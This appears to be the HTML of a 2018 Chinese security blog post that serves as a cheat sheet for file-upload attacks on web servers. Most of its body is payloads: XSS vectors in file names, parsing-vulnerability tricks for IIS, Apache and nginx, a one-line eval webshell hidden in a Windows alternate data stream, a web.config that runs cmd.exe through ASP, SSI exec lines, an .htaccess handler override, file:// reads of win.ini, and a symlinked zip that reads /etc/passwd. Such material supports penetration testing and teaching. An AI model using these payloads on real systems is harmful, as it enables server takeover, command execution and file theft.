@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>file-upload</title>
+  <meta name="description" content="0x00 前言  对文件上传进行一个总结,如果你还没有看过Upload-labs通关手册，建议先看，本文是对其的一个简单补充,另外本文不对跨域等进行总结，后续会陆续添加。">
+  <meta name="author" content="leopardpan">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="file-upload">
+  <meta name="twitter:description" content="0x00 前言  对文件上传进行一个总结,如果你还没有看过Upload-labs通关手册，建议先看，本文是对其的一个简单补充,另外本文不对跨域等进行总结，后续会陆续添加。">
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="file-upload">
+  <meta property="og:description" content="0x00 前言  对文件上传进行一个总结,如果你还没有看过Upload-labs通关手册，建议先看，本文是对其的一个简单补充,另外本文不对跨域等进行总结，后续会陆续添加。">
+  
+  <link rel="icon" type="image/png" href="/images/favicon.png" />
+  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="canonical" href="http://localhost:4000/2018/07/file-upload/">
+  <link rel="alternate" type="application/rss+xml" title="whynot" href="http://localhost:4000/feed.xml">
+  
+  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
+
+<!-- 站点统计 -->
+  <script 
+  async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+  </script>  
+
+<!-- 百度统计 -->
+  
+  <script>
+      var _hmt = _hmt || [];
+      (function() {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?7e193e944675994f2e720fe92e3b32f1";
+        var s = document.getElementsByTagName("script")[0]; 
+        s.parentNode.insertBefore(hm, s);
+      })();
+  </script>
+  
+
+<!-- google 统计 -->
+  
+  <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-120601257-1', 'auto');
+      ga('send', 'pageview');
+  </script>
+  
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-9005224472374751",
+    enable_page_level_ads: true
+  });
+</script>
+
+</head>
+
+
+  <body>
+
+    <span class="mobile btn-mobile-menu">        
+      <div class="nav_container">
+         <nav class="nav-menu-item" style = "float:right">
+            <i class="nav-menu-item">
+              <a href="/#blog" title="" class="blog-button">  博客主页
+              </a>
+            </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/archive" title="archive" class="btn-mobile-menu__icon">
+                      所有文章
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
+                      标签
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/about" title="about" class="btn-mobile-menu__icon">
+                      关于我
+                  </a>
+                </i>
+            
+          </nav>
+      </div>
+    </span>
+    
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <!-- 头像效果-start -->
+        <div class="ih-item circle effect right_to_left">            
+            <a href="/#blog" title="前往 whynot 的主页" class="blog-button">
+                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
+                <div class="info">
+                    <div class="info-back">
+                        <h2> 
+                            
+                                whynotke
+                            
+                        </h2>
+                        <p>
+                           
+                                web / sec
+                            
+                        </p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <!-- 头像效果-end -->
+        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for whynot" class="blog-button">whynot</a></h1>
+        
+        <span class="panel-cover__subtitle panel-subtitle">web sec</span>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">欢迎来到我的博客~</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        
+        
+
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客主页</a></li>
+                
+                  <li class="navigation__item"><a href="/archive" title="archive">所有文章</a></li>
+                
+                  <li class="navigation__item"><a href="/tags" title="tags">标签</a></li>
+                
+                  <li class="navigation__item"><a href="/about" title="about">关于我</a></li>
+                
+              </ul>
+            </nav>
+          </div>          
+        </div>
+
+
+        </div>
+      </div>
+    </div>
+    
+    
+    <div class="panel-cover--overlay cover-clear"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title">file-upload</h1>
+    <div class="post-meta">
+      <img src="/images/calendar.png" width="20px"/> 
+      <time datetime="2018-07-30 00:00:00 +0800" itemprop="datePublished" class="post-meta__date date">2018-07-30</time>  
+         
+      <span id="busuanzi_container_page_pv"> | 阅读：<span id="busuanzi_value_page_pv"></span>次</span>
+    </p>
+    </div>
+  </header>
+
+  <section class="post">
+    <h1 id="0x00-前言">0x00 前言</h1>
+<hr />
+<p>  对文件上传进行一个总结,如果你还没有看过<a href="https://xz.aliyun.com/t/2435">Upload-labs通关手册</a>，建议先看，本文是对其的一个简单补充,另外本文不对跨域等进行总结，后续会陆续添加。</p>
+
+<h1 id="0x01-通用">0x01 通用</h1>
+<h2 id="1-shell">1. shell</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="err">%</span> <span class="na">out</span><span class="err">.</span><span class="na">println</span><span class="err">("</span><span class="na">Hello</span> <span class="na">test</span><span class="err">");%</span><span class="nt">&gt;</span>     #jsp jspx 
+<span class="nt">&lt;</span><span class="err">%</span><span class="na">response</span><span class="err">.</span><span class="na">write</span><span class="err">("</span><span class="na">hello</span> <span class="na">test</span><span class="err">")%</span><span class="nt">&gt;</span>        #asp asmx aspx ashx soap web.config
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="mi">11111</span><span class="p">;</span><span class="cp">?&gt;</span>     #php phtml phps  phpt php3 php3p php4 php5   #主要看配置  
+有些管理员可能会把php和asp程序设置在一个大目录下(虚拟主机)
+</code></pre></div></div>
+<h2 id="2-xss">2. xss</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>上传htm html shtml xml文件等
+Basic XSS payload: &lt;script&gt;alert(1337)&lt;/script&gt;
+XML-based XSS payload: &lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(1337)&lt;/a:script&gt;
+"&gt;&lt;img src=# onerror=alert(1)&gt;.jpg   #文件上传输出文件名导致xss window也可以
+</code></pre></div></div>
+<h2 id="3-解析漏洞">3. 解析漏洞</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iis  
+文件格式： asa cer cdx
+目录解析： /1.asp/1.jpg  #上传1.jpg拿到shell
+文件解析： 1.asp;.jpg 
+IIS 7.0/IIS 7.5
+1.jpg/.php  #上传1.jpg 在后面加上/.php直接当成php来执行
+
+apache
+1.php.aaa   #遇到不能解析的类型递归向前解析 默认类型一般是text/plain
+1.php%0a    影响2.4.0~2.4.29 linux服务器#上传时1.php后面添加一个\x0A #CVE-2017-15715 https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html 
+
+nginx&lt;8.03空字节代码执行漏洞 
+1.jpg%00.php   #上传1.jpg然后web访问
+1.jpg/.php  #上传1.jpg 在后面加上/.php直接当成php来执行
+Nginx 0.8.41至1.4.3版本和1.5.7之前的1.5.x版本 CVE-2013-4547   #绕过访问限制读取s.html 
+http://127.0.0.1/test /../protected/s.html  #注意test目录后有一个空格
+# 解析漏洞需要test%20目录(window不需要) #使用curl测试 
+1.jpg \0.php  #1.jpg[0x20][0x00].php    #使用burp更改编码
+
+#IIS和Nginx一看到URL中文件后缀是.php就把它当成php来解析  
+cgi.fix_pathinfo(php会对路径进行修理如/tt.php/111.jpg/111.jpg 1.jpg不存在会当成1.php处理) 
+
+lighttpd
+1.jpg/1.php
+
+php cgi解析漏洞
+配置文件中的选项cgi.fix_pathinfo = 1开启时 当访问http://www.xxx.com/x.txt/x.php x.php不存在 会把x.txt当成php来执行
+
+</code></pre></div></div>
+
+<h1 id="0x02-window">0x02 window</h1>
+<h2 id="1截断">1.截断</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window 文件命名规范   #https://docs.microsoft.com/zh-cn/windows/desktop/FileIO/naming-a-file  
+window8.3能用但是会重命名为web~1.con     Note 1: Windows 8.3 feature could also be used but it would rename the web.config file to web~1.con in the end.
+不能直接上传带有&lt; &gt;的文件，只能覆盖他们   Note 2: Asterisk and question mark symbols cannot be used directly as the file system rejects them.
+尽量手动去输出，而不是简单的复制粘贴      Note 3: Sometimes WordPress replaces double and single quotation marks with visually similar symbols. Therefore, it is recommended to type the vectors yourself in Burp Suite or other proxies that you use instead of copy/paste them directly from here.
+PHP Windows     #也可以用来文件包含
+&gt;       ?       #Greater-than symbol (closing angle bracket “&gt;”) TO a question mark (“?”)
+&lt;       *       #Less-than symbol (opening angle bracket “&lt;”) TO an asterisk symbol (“*”)
+"       .       #Double quotation mark (""") TO a dot character ("."")   
+
+1.php%20(url decode)    1.php.    1.php%00(url decode)  #生成1.php文件
+1.php:aaa               #生成空文件 前提是该文件不存在
+1.ph&lt; or 1.ph&gt;          #生成php webshell文件。
+
+echo ^&lt;?php @eval(request[caidao])?^&gt;  &gt; index.php:hidden.jpg
+这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:hidden.jpg’)?&gt;，这样子就可以正常解析我们的一句话了
+</code></pre></div></div>
+<h2 id="2ads文件流">2.ads文件流</h2>
+<p>1.php::$DATA    #文件流 生成1.php文件  图片名字:流的名字:流类型</p>
+<h1 id="0x03-linux">0x03 linux</h1>
+<h2 id="1文件上传xss">1.文件上传xss</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;&lt;img src=# onerror=alert(1)&gt;.jpg   #上传输出文件名导致xss linux 调用文件处也可以 可以在w3school测试https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value  
+linux 上传php不解析 pHp绕过
+</code></pre></div></div>
+<h1 id="0x04-iis">0x04 IIS</h1>
+<h2 id="1xss">1.xss</h2>
+<p>根据web server服务器fuzz一些不常见的后缀名，同样可以导致xss,详情可以参考这篇文章https://mike-n1.github.io/ExtensionsOverview<br />
+basic    .cer .hxt .htm  .stm<br />
+xml    .dtd .mno .vml .xsl .xht .svg .xml .xsd .xsf .svgz .xslt .wsdl .xhtml</p>
+<h2 id="2file_include-or-command_exec">2.file_include or command_exec</h2>
+<p>默认情况下，IIS也支持SSI(Server-Side Include)扩展，SSI是为WEB服务器提供的一套命令，这些命令只要直接嵌入到HTML文档的注释内容之中即可，由于安全原因，默认情况下命令会被禁止。<br />
+<strong>若服务器不支持.shtml #IIS 角色服务-应用程序开发-在服务器端包含图片点击安装角色即可</strong> <br />
+https://docs.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!--#include file="web.config"--&gt;   //可以用来读文件
+&lt;!--#include virtual="/includes/header.html" --&gt; //也是读文件 绝对路径
+&lt;!--#exec cmd="ipconfig"--&gt; //是否可以用来执行命令 默认情况不会开启 需要配置相关数据  #win2008 IIS7尝试开启失败
+Extensions for SSI: .stm .shtm .shtml   #iis常见的一般自定义配置值 其他如apache自己配置 一般为.shtml  
+</code></pre></div></div>
+<h2 id="3shell">3.shell</h2>
+<p>asp asmx ashx soap svc      #http://py4.me/blog/?p=448</p>
+<h3 id="webconfig-需要asp环境支持">web.config #需要asp环境支持</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;configuration&gt;</span>
+    <span class="nt">&lt;system.webServer&gt;</span>
+        <span class="nt">&lt;handlers</span> <span class="na">accessPolicy=</span><span class="s">"Read, Script, Write"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">"web_config"</span> <span class="na">path=</span><span class="s">"*.config"</span> <span class="na">verb=</span><span class="s">"*"</span> <span class="na">modules=</span><span class="s">"IsapiModule"</span> <span class="na">scriptProcessor=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="na">resourceType=</span><span class="s">"Unspecified"</span> <span class="na">requireAccess=</span><span class="s">"Write"</span> <span class="na">preCondition=</span><span class="s">"bitness64"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;/handlers&gt;</span>
+        <span class="nt">&lt;security&gt;</span>
+            <span class="nt">&lt;requestFiltering&gt;</span>
+                <span class="nt">&lt;fileExtensions&gt;</span>
+                    <span class="nt">&lt;remove</span> <span class="na">fileExtension=</span><span class="s">".config"</span> <span class="nt">/&gt;</span>
+                <span class="nt">&lt;/fileExtensions&gt;</span>
+                <span class="nt">&lt;hiddenSegments&gt;</span>
+                    <span class="nt">&lt;remove</span> <span class="na">segment=</span><span class="s">"web.config"</span> <span class="nt">/&gt;</span>
+                <span class="nt">&lt;/hiddenSegments&gt;</span>
+            <span class="nt">&lt;/requestFiltering&gt;</span>
+        <span class="nt">&lt;/security&gt;</span>
+    <span class="nt">&lt;/system.webServer&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+<span class="err">&lt;</span>%response.write("asp test")%&gt;
+通过填入下面语句可成功执行asp语句
+<span class="err">&lt;</span>%
+Response.write CreateObject("wscript.shell").exec("cmd.exe /c ipconfig").StdOut.ReadAll
+%&gt;
+<span class="err">&lt;</span>%=CreateObject("wscript.shell").exec("cmd.exe /c ipconfig").StdOut.ReadAll()%&gt;
+</code></pre></div></div>
+<h3 id="asmx">asmx</h3>
+<p>asmx demo</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ WebService Language="C#" Class="Service" %&gt;
+ 
+using System.Web;
+using System.Web.Services;
+using System.Web.Services.Protocols;
+ 
+public class Service : System.Web.Services.WebService
+{
+    [WebMethod]
+    public string HelloWorld() {
+        return "HelloWorld";
+    }
+}
+
+http://192.168.44.132:8980/customize.asmx/Chopper   #菜刀密码z
+z=A     #POST查看运行目录  
+http://192.168.44.132:8980/asmxWebMethodSpy.asmx/Invoke     #密码Ivan
+</code></pre></div></div>
+<h3 id="ashx">ashx</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//浏览器访问这个ashx文件打印Test!  #证明可以使用
+&lt;%@ WebHandler Language="C#" Class="Handler" %&gt;
+using System;
+using System.Web;
+public class Handler : IHttpHandler{
+    public void ProcessRequest(HttpContext context)
+    {
+        context.Response.Write("Test!");
+    }
+    public bool IsReusable
+    {
+        get
+        {
+            return false;
+        }
+    }
+}
+http://192.168.44.132:8980/HandlerSpy.ashx?Ivan=context.Response.Write(DateTime.Now.ToString())     #输出时间
+</code></pre></div></div>
+<h1 id="0x05-apahce--httpd-or-tomcat">0x05 apahce  (httpd or Tomcat)</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>basic   .html.xxx .shtml
+xml .rdf .xht .xml .xsl .svg .xhtml .svgz   #apache返回包里面没有Content-type 这样就可能根据浏览器的习性造成xss攻击  
+</code></pre></div></div>
+<h2 id="1-shell-1">1. shell</h2>
+<p>.htaccess</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SetHandler application/x-httpd-php  #所有文件解析成php 也可以解析成其他脚本形式如perl ruby参考https://github.com/wireghoul/htshells
+</code></pre></div></div>
+<h1 id="0x06-nginx">0x06 nginx</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>basic   .htm
+xml     .svg .xml .svgz
+</code></pre></div></div>
+<h1 id="0x07文件读取-or-ssrf-or-rce">0x07.文件读取 or SSRF or rce</h1>
+<h2 id="通过客户端或者相应的前端框架本地读取相应html">通过客户端或者相应的前端框架本地读取相应html</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(document.location);&lt;/script&gt;  #get file_location  查看当前源  
+动态的执行相关js   #前提是调用文件使用file协议
+&lt;embed src="c:\\windows\\win.ini" width="400" height="400"&gt;
+&lt;object width="400" height="400" data="file://c:/windows/win.ini"&gt;&lt;/object&gt;
+&lt;iframe src="file:///C:/Windows/win.ini" width="400" height="400"&gt;
+&lt;embed src="file://c:/windows/win.ini" width="400" height="400"&gt;
+&lt;iframe src="http://localhost"&gt;&lt;/iframe&gt;
+&lt;iframe src="../../../web.xml"&gt;&lt;/iframe&gt;
+
+http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
+https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/
+https://mike-n1.github.io/SSRF_P4toP2
+https://hackernoon.com/cross-site-scripting-to-remote-code-execution-on-trellos-app-699512676f0c    #Cross-Site Scripting to Local File Inclusion on Trello’s App
+https://hackerone.com/reports/243058
+https://maustin.net/2015/11/12/hipchat_rce.html     #XSS to RCE in Atlassian Hipchat
+https://medium.com/@arbazhussain/xss-using-dynamically-generated-js-file-a7a10d05ff08
+</code></pre></div></div>
+<h2 id="2zip自解压">2.zip自解压</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ln -s /etc/passwd link
+zip --symlinks test.zip link    #通过自解压zip功能实现文件读取https://xz.aliyun.com/t/2589    #上传软链接读取passwd ln -s / test
+</code></pre></div></div>
+
+<p>其他参考链接如下：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf     #iis端文件名漏洞
+https://github.com/ironbee/ironbee-rules/blob/master/support/php/test_fs_evasion.php 
+https://soroush.secproject.com/blog/2014/07/file-upload-and-php-on-iis-wildcards/  
+http://byd.dropsec.xyz/2017/02/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87/
+</code></pre></div></div>
+<p>#
+转载请注明：<a href="https://notwhy.github.io/">whynot</a> » <a href="https://notwhy.gitbooks.io//2018/07/file-upload/">file-upload</a></p>
+
+
+
+  </section>
+</article>
+
+<section>
+
+            <div class="content-play">
+              <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下">打赏一个呗</a></p>
+              <div class="hide_box-play"></div>
+              <div class="shang_box-play">
+                <a class="shang_close-play" href="javascript:void(0)" onclick="dashangToggle()" title="关闭"><img src="/images/payimg/close.jpg" alt="取消" /></a>
+                <div class="shang_tit-play">
+                  <p>感谢您的支持，我会继续努力的!</p>
+                </div>
+                <div class="shang_payimg">
+                    <img src="/images/payimg/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+              <div class="shang_payimg">    
+                    <img src="/images/payimg/weipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+                <div class="pay_explain">扫码打赏，你说多少就多少</div>
+                <div class="shang_payselect">
+                  <div class="pay_item checked" data-id="alipay">
+                    <span class="pay_logo"><img src="/images/payimg/alipay.jpg" alt="支付宝" /></span>
+                  </div>
+                  <div class="pay_item" data-id="weipay">
+                    <span class="pay_logo"><img src="/images/payimg/wechat.jpg" alt="微信" /></span>
+                  </div>
+                </div>
+                <div class="shang_info-play">
+                  <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+                </div>
+              </div>
+            </div>
+            <script type="text/javascript">
+            function dashangToggle(){
+              $(".hide_box-play").fadeToggle();
+              $(".shang_box-play").fadeToggle();
+            }
+            </script>
+
+            <div style="text-align:center;margin:50px 0; font:normal 14px/24px 'MicroSoft YaHei';"></div>
+
+            <style type="text/css">
+              .content-play{width:80%;margin-top: 20px;margin-bottom: 10px;height:40px;}
+              .hide_box-play{z-index:999;filter:alpha(opacity=50);background:#666;opacity: 0.5;-moz-opacity: 0.5;left:0;top:0;height:99%;width:100%;position:fixed;display:none;}
+              .shang_box-play{width:540px;height:540px;padding:10px;background-color:#fff;border-radius:10px;position:fixed;z-index:1000;left:50%;top:50%;margin-left:-280px;margin-top:-280px;border:1px dotted #dedede;display:none;}
+              .shang_box-play img{border:none;border-width:0;}
+              .dashang{display:block;width:100px;margin:5px auto;height:25px;line-height:25px;padding:10px;background-color:#E74851;color:#fff;text-align:center;text-decoration:none;border-radius:10px;font-weight:bold;font-size:16px;transition: all 0.3s;}
+              .dashang:hover{opacity:0.8;padding:15px;font-size:18px;}
+              .shang_close-play{float:right;display:inline-block;
+                margin-right: 10px;margin-top: 20px;
+              }
+              .shang_logo{display:block;text-align:center;margin:20px auto;}
+              .shang_tit-play{width: 100%;height: 75px;text-align: center;line-height: 66px;color: #a3a3a3;font-size: 16px;background: url('/images/payimg/cy-reward-title-bg.jpg');font-family: 'Microsoft YaHei';margin-top: 7px;margin-right:2px;}
+              .shang_tit-play p{color:#a3a3a3;text-align:center;font-size:16px;}
+              .shang_payimg{width:140px;padding:10px;padding-left: 80px; /*border:6px solid #EA5F00;**/margin:0 auto;border-radius:3px;height:140px;display:inline-block;}
+              .shang_payimg img{display:inline-block;margin-right:10px;float:left;text-align:center;width:140px;height:140px; }
+              .pay_explain{text-align:center;margin:10px auto;font-size:12px;color:#545454;}
+              .shang_payselect{text-align:center;margin:0 auto;margin-top:40px;cursor:pointer;height:60px;width:500px;margin-left:110px;}
+              .shang_payselect .pay_item{display:inline-block;margin-right:140px;float:left;}
+              .shang_info-play{clear:both;}
+              .shang_info-play p,.shang_info-play a{color:#C3C3C3;text-align:center;font-size:12px;text-decoration:none;line-height:2em;}
+            </style>
+
+       <ul class="pager">
+        
+        <li class="previous">
+            <a href="/2018/06/sql-injection-fuck-waf/" data-toggle="tooltip" data-placement="top" title="sql-injection-fuck-waf">上一篇：  <span>sql-injection-fuck-waf</span>
+            </a>
+        </li>
+        
+        
+        <li class="next">
+            <a href="/2018/08/RichFaces%E5%8F%8D%E5%BA%8F%E5%88%97%E8%AF%9D%E6%BC%8F%E6%B4%9E-CVE-2013-2165/" data-toggle="tooltip" data-placement="top" title="RichFaces反序列话漏洞——CVE-2013-2165">下一篇：  <span>RichFaces反序列话漏洞——CVE-2013-2165</span>
+            </a>
+        </li>
+        
+    </ul>
+</section>
+
+<section class="post-comments">
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+    
+    var disqus_config = function () {
+        this.page.url = "http://localhost:4000/2018/07/file-upload/";
+        this.page.identifier = "/2018/07/file-upload/";
+    };
+    var disqus_shortname = 'whynot1';
+    
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>要查看<a href="http://disqus.com/?ref_noscript"> Disqus </a>评论，请启用 JavaScript</noscript>
+    
+  
+
+</section>
+
+
+            <section class="footer">
+    <footer>
+        <div class = "footer_div">  
+        <nav class="cover-navigation navigation--social">
+          <ul class="navigation">
+
+          
+
+          
+          <!-- Github -->
+          <li class="navigation__item_social">
+            <a href="https://github.com/notwhy" title="@notwhy 的 Github" target="_blank">
+              <i class='social fa fa-github fa-2x'></i>
+              <span class="label">Github</span>
+            </a>
+          </li>
+          
+          
+          
+          <!-- Twitter -->
+          <li class="navigation__item_social">
+            <a href="http://twitter.com/whynotke" title="@whynotke" target="_blank">
+              <i class='social fa fa-twitter fa-2x'></i>
+              <span class="label">Twitter</span>
+            </a>
+          </li>
+          
+
+          
+
+          <!-- RSS -->
+          <li class="navigation__item_social">
+            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+              <i class='social fa fa-rss fa-2x'></i>
+              <span class="label">RSS</span>
+            </a>
+          </li>
+
+          
+          <!-- Email -->
+          <li class="navigation__item_social">
+            <a href="mailto:547103907@qq.com" title="Contact me">
+              <i class='social fa fa-envelope fa-2x'></i>
+              <span class="label">Email</span>
+            </a>
+          </li>
+          
+
+          </ul>
+        </nav>
+
+        </div>
+
+        <div class = "footer_div">  
+           <p class="copyright text-muted">
+            Copyright &copy; whynot 2018 Theme by <a href="http://baixin.io/">leopardpan</a> |
+            </p>
+        	<div align="right">
+    			<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+          <!-- 访问统计 -->
+          <span id="busuanzi_container_site_pv">
+            本站总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+          </span>
+
+        </div>
+        <div>
+    </footer>
+</section>
+
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript" src="/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+    
+  </body>
+
+</html>
